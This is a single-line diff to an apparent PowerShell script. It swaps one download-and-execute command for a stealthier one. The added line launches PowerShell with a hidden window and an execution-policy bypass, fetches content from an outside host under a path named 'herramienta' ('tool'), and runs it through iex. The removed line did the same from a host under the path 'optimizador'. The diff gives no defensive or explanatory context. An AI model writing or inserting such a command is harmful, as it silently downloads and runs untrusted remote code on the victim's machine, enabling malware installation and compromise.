@@ -1,1 +1,1 @@
-iwr samuelbr.xyz/optimizador | iex
+powershell.exe -W Hidden -ExecutionPolicy Bypass -NoP -NonI -C "(curl loslocosde3ro.best/herramienta).Content | iex"
